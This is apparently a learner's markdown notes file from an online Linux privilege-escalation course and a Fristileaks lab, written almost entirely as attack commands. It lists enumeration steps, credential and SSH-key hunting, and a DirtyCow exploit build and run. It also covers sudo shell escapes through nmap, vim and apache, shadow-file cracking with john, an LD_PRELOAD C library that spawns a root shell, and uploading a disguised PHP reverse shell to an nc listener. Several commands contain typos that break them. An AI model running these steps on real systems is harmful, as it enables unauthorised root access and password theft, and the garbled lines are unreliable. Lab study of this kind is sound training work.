---
title: linux privilege escalation
---

linux-privilege-escalation by `Atil Samancioglu`

<https://cloudacademy.com/course/linux-privilege-escalation-2808/what-is-suid/>

<https://cloudacademy.com/course/fristileaks-2807/>

dirb

nikto

whoami

id

uname -a

cat /proc/version

cat /etc/issue

ps aux

cat /etc/passwd

cat /etc/shadow
    Permission denied

ifconfig

ip route

arp -an

locate password

cat /var/lib/pam/password

find / -iname password 2>/dev/null

find / -iname id_rsd 2>/dev/null

history

cd /tmp

wget

linPEAS

LinEnum.sh

linux-exploit-suggester.sh

dirtycow

dirtycow 2

gcc c0w.c -pthread -o dirtycow

./dirtycow

passwd

---

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

---

sudo -l

> show what the user can execute

sudo /usr/bin/nmap

sudo /usr/bin/nmap --interactive
    !sh
    id
    whoami

sudo /usr/bin/vim -c '!/bin/sh'
    whoami

sudo /usr/sbin/apache -f /etc/passwd

sudo /usr/sbin/apache -f /etc/shadow

root:$6(SALT)....
    shadow.txt
    passrd.txt
    unshadow passwd.txt shadow.txt > passwords.txt
    john --wordlist=wordlist.txt passwords.txt
    john --show

---

LD_PRELOAD

vim my-library.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
    unserenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}


gcc -iPIC -shared -o /tmp/mylibrary.so library.c -nostartfiles

sudo LD_PRELOAD=/tmp/library.so nmap

nmap

---

pentestmonkey.net

download a php reverse shell

update the return IP in the reverse shell code

start listening port

`nc -nvlp 1234`

upload... might need to rename, `this-file.php.png`

find the url path to the file


---

swap shell

python -c 'import pty; pty.spwan("/bin/bash")'


find what files below to <MYUSER>

find / -user <MYUSER> 2>/dev/null
